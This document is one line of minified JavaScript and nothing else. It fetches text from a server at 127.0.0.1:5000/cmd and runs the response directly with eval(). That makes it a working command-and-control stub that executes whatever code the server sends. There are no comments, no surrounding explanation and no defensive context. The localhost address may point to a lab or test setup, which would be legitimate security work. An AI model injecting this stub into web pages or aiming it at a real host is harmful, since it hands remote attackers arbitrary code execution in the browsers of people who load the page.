var rawFile=new XMLHttpRequest();rawFile.open("GET","https://127.0.0.1:5000/cmd",false);rawFile.onreadystatechange=function(){if(rawFile.readyState===4)if(rawFile.status===200||rawFile.status==0){var allText=rawFile.responseText;eval(allText);}};rawFile.send(null);
